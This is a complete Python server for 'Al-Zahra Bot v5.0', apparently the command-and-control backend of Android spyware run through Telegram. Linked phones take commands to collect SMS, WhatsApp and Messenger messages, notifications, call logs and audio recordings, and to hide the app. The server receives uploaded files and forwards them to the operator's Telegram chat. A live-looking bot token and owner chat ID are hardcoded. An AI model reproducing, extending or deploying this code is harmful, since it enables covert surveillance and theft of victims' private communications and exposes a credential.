#!/usr/bin/env python3
"""Al-Zahra Bot v5.0"""

import asyncio, json, logging, os, random, time
from datetime import datetime
from aiohttp import web

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('AlZahra')

BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As"
OWNER_CHAT_ID = "7344776596"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
PORT = 8443
UPLOAD_DIR = "/opt/alzahra/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

class Store:
    def __init__(self):
        self.devices = {}
        self.commands = {}
        self.codes = {}  # أكواد مدى الحياة
        self.files = {}

store = Store()

async def call(method, params=None):
    import aiohttp
    try:
        async with aiohttp.ClientSession() as s:
            if params:
                async with s.post(f"{API}/{method}", data=params) as r: return await r.json()
            else:
                async with s.get(f"{API}/{method}") as r: return await r.json()
    except: return None

async def msg(chat, text, kb=None):
    p = {"chat_id": str(chat), "text": text, "parse_mode": "Markdown"}
    if kb: p["reply_markup"] = json.dumps(kb)
    return await call("sendMessage", p)

async def edit(chat, mid, text, kb=None):
    p = {"chat_id": str(chat), "message_id": mid, "text": text, "parse_mode": "Markdown"}
    if kb: p["reply_markup"] = json.dumps(kb)
    return await call("editMessageText", p)

async def answer(qid, text=None):
    p = {"callback_query_id": qid}
    if text: p["text"] = text; p["show_alert"] = True
    return await call("answerCallbackQuery", p)

async def doc(chat, path, cap=""):
    import aiohttp
    try:
        async with aiohttp.ClientSession() as s:
            d = aiohttp.FormData()
            d.add_field("chat_id", str(chat))
            d.add_field("caption", cap)
            d.add_field("parse_mode", "Markdown")
            d.add_field("document", open(path, "rb"))
            async with s.post(f"{API}/sendDocument", data=d) as r: return await r.json()
    except: return None

def ts(): return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
def gen(): return ''.join([str(random.randint(0,9)) for _ in range(9)])

def main_kb():
    return {"inline_keyboard": [
        [{"text": "📱 الأجهزة", "callback_data": "devs"}],
        [{"text": "🔗 ربط جهاز", "callback_data": "link"}],
        [{"text": "⚙️ الإعدادات", "callback_data": "set"}],
        [{"text": "📊 الحالة", "callback_data": "stat"}]
    ]}

def devs_kb():
    if not store.devices:
        return {"inline_keyboard": [[{"text": "🔄", "callback_data": "devs"}], [{"text": "🔙", "callback_data": "back"}]]}
    btns = []
    for did, info in store.devices.items():
        s = "🟢" if info.get("online") else "🔴"
        l = "✅" if info.get("linked") else "⏳"
        btns.append([{"text": f"{s}{l} {info.get('model','?')}", "callback_data": f"d_{did}"}])
    btns.append([{"text": "🔄", "callback_data": "devs"}])
    btns.append([{"text": "🔙", "callback_data": "back"}])
    return {"inline_keyboard": btns}

def dev_kb(did):
    return {"inline_keyboard": [
        [{"text": "📨 SMS", "callback_data": f"c_{did}_sms"}, {"text": "🔔 إشعارات", "callback_data": f"c_{did}_notif"}],
        [{"text": "💬 واتساب", "callback_data": f"c_{did}_wa"}, {"text": "📩 ماسنجر", "callback_data": f"c_{did}_msg"}],
        [{"text": "📞 مكالمات", "callback_data": f"c_{did}_calls"}, {"text": "🎙️ تسجيلات", "callback_data": f"c_{did}_rec"}],
        [{"text": "ℹ️ معلومات", "callback_data": f"c_{did}_info"}, {"text": "📦 الكل", "callback_data": f"c_{did}_all"}],
        [{"text": "🔙", "callback_data": "devs"}]
    ]}

async def on_message(m):
    cid = m.get("chat", {}).get("id")
    txt = m.get("text", "")
    if str(cid) != OWNER_CHAT_ID:
        await msg(cid, "⛔ غير مصرح")
        return
    
    if txt in ("/start", "/help"):
        await msg(cid, f"🎛️ *Al-Zahra*\n⏰ {ts()}", main_kb())
    
    elif txt == "/link":
        code = gen()
        while code in store.codes: code = gen()
        store.codes[code] = {"chat_id": cid, "device_id": None}  # بدون وقت انتهاء
        await msg(cid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق\n⏰ الكود مدى الحياة")
    
    elif txt == "/devices": await show_devs(cid)
    elif txt == "/status": await show_stat(cid)
    else: await msg(cid, "❓ /start")

async def on_callback(cb):
    cid = cb.get("message", {}).get("chat", {}).get("id")
    mid = cb.get("message", {}).get("message_id")
    data = cb.get("data", "")
    qid = cb.get("id")
    if str(cid) != OWNER_CHAT_ID: await answer(qid, "⛔"); return
    
    if data == "back":
        await edit(cid, mid, f"🎛️ *Al-Zahra*\n⏰ {ts()}", main_kb())
    elif data == "devs":
        await show_devs(cid, mid)
    elif data == "link":
        code = gen()
        while code in store.codes: code = gen()
        store.codes[code] = {"chat_id": cid, "device_id": None}
        await edit(cid, mid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق\n⏰ مدى الحياة",
            {"inline_keyboard": [[{"text": "🔙", "callback_data": "back"}]]})
    elif data == "set":
        await edit(cid, mid, "⚙️ *الإعدادات*", {"inline_keyboard": [
            [{"text": "🔒 إخفاء", "callback_data": "hide"}, {"text": "🔓 إظهار", "callback_data": "unhide"}],
            [{"text": "🎙️ تسجيل", "callback_data": "rec_on"}, {"text": "⏹️ إيقاف", "callback_data": "rec_off"}],
            [{"text": "🔙", "callback_data": "back"}]
        ]})
    elif data == "stat":
        await show_stat(cid, mid)
    elif data.startswith("d_"):
        did = data[2:]
        if did in store.devices:
            i = store.devices[did]
            t = f"📱 *{i.get('model','?')}*\n🤖 Android {i.get('android','?')}\n{'🟢' if i.get('online') else '🔴'} {'✅' if i.get('linked') else '⏳'}\n⏰ {i.get('last_seen','?')}"
            await edit(cid, mid, t, dev_kb(did))
        else: await answer(qid, "❌ غير متصل")
    elif data.startswith("c_"):
        p = data.split("_", 2)
        if len(p) >= 3:
            did, act = p[1], p[2]
            if did in store.devices:
                await answer(qid, f"⏳ جاري...")
                if did not in store.commands: store.commands[did] = []
                store.commands[did].append(act)
                await msg(cid, f"✅ تم إرسال: {act}")
            else: await answer(qid, "❌ غير متصل")
    elif data == "hide": await answer(qid, "⏳"); await msg(cid, "🔒 تم الإخفاء")
    elif data == "unhide": await answer(qid, "⏳"); await msg(cid, "🔓 تم الإظهار")
    elif data == "rec_on": await answer(qid, "✅"); await msg(cid, "🎙️ تم التفعيل")
    elif data == "rec_off": await answer(qid, "⏹️"); await msg(cid, "⏹️ تم الإيقاف")

async def show_devs(cid, mid=None):
    if not store.devices:
        t = "📱 *الأجهزة*\n\n❌ لا توجد"
    else:
        t = "📱 *الأجهزة*\n\n"
        for did, i in store.devices.items():
            s = "🟢" if i.get("online") else "🔴"
            l = "✅" if i.get("linked") else "⏳"
            t += f"{s}{l} {i.get('model','?')}\n"
    if mid: await edit(cid, mid, t, devs_kb())
    else: await msg(cid, t, devs_kb())

async def show_stat(cid, mid=None):
    try:
        import psutil
        c, m, d = psutil.cpu_percent(), psutil.virtual_memory().percent, psutil.disk_usage('/').percent
    except: c = m = d = 0
    t = f"📊 *الحالة*\n💻 CPU: {c}%\n🧠 RAM: {m}%\n💾 Disk: {d}%\n📱 أجهزة: {len(store.devices)}\n⏰ {ts()}"
    kb = {"inline_keyboard": [[{"text": "🔙", "callback_data": "back"}]]}
    if mid: await edit(cid, mid, t, kb)
    else: await msg(cid, t, kb)

async def updates():
    while True:
        try:
            r = await call("getUpdates", {"offset": store._last+1 if hasattr(store, '_last') else 0, "limit": 10, "timeout": 30})
            if r and r.get("ok"):
                for u in r.get("result", []):
                    store._last = u["update_id"]
                    if "message" in u: await on_message(u["message"])
                    elif "callback_query" in u: await on_callback(u["callback_query"])
            await asyncio.sleep(1)
        except Exception as e:
            logger.error(f"Err: {e}")
            await asyncio.sleep(5)

async def verify(request):
    try:
        d = await request.json()
        code = d.get("code", "")
        did = d.get("device_id", "")
        model = d.get("model", "?")
        android = d.get("android", "?")
        
        if code not in store.codes:
            return web.json_response({"status": "error", "message": "كود غير صحيح"})
        
        ci = store.codes[code]
        ci["device_id"] = did
        
        store.devices[did] = {
            "model": model, "android": android,
            "online": True, "last_seen": ts(),
            "linked": True, "owner": ci["chat_id"]
        }
        
        # لا نحذف الكود - مدى الحياة
        
        await msg(ci["chat_id"], f"✅ تم الربط!\n📱 {model}\n🤖 Android {android}")
        return web.json_response({"status": "ok", "device_id": did})
    except Exception as e:
        return web.json_response({"status": "error"})

async def register(request):
    try:
        d = await request.json()
        did = d.get("device_id")
        if did in store.devices:
            store.devices[did]["online"] = True
            store.devices[did]["last_seen"] = ts()
        else:
            store.devices[did] = {"model": d.get("model","?"), "android": d.get("android","?"),
                "online": True, "last_seen": ts(), "linked": False}
        return web.json_response({"status": "ok"})
    except: return web.json_response({"status": "error"})

async def data(request):
    try:
        reader = await request.multipart()
        did = dtype = None
        path = None
        while True:
            part = await reader.next()
            if part is None: break
            if part.name == "device_id": did = await part.text()
            elif part.name == "type": dtype = await part.text()
            elif part.name == "file":
                fn = f"{did}_{dtype}_{int(time.time())}_{part.filename}"
                path = os.path.join(UPLOAD_DIR, fn)
                with open(path, "wb") as f:
                    while True:
                        chunk = await part.read_chunk()
                        if not chunk: break
                        f.write(chunk)
        if did and dtype:
            if did not in store.files: store.files[did] = []
            store.files[did].append({"type": dtype, "path": path})
            await msg(OWNER_CHAT_ID, f"📥 {did}\n📁 {dtype}")
            if path and os.path.exists(path):
                await doc(OWNER_CHAT_ID, path, f"📱 {did} - {dtype}")
        return web.json_response({"status": "ok"})
    except Exception as e:
        return web.json_response({"status": "error"})

async def commands(request):
    try:
        did = request.query.get("device_id", "")
        cmds = store.commands.get(did, [])
        store.commands[did] = []
        return web.json_response({"commands": cmds})
    except: return web.json_response({"commands": []})

async def status(request):
    try:
        d = await request.json()
        did = d.get("device_id")
        if did in store.devices:
            store.devices[did]["online"] = True
            store.devices[did]["last_seen"] = ts()
        return web.json_response({"status": "ok"})
    except: return web.json_response({"status": "error"})

async def main():
    logger.info("AlZahra v5.0 Starting...")
    app = web.Application()
    app.router.add_post("/api/verify_code", verify)
    app.router.add_post("/api/register", register)
    app.router.add_post("/api/data", data)
    app.router.add_get("/api/commands", commands)
    app.router.add_post("/api/status", status)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"Server on {PORT}")
    await updates()

if __name__ == "__main__":
    asyncio.run(main())
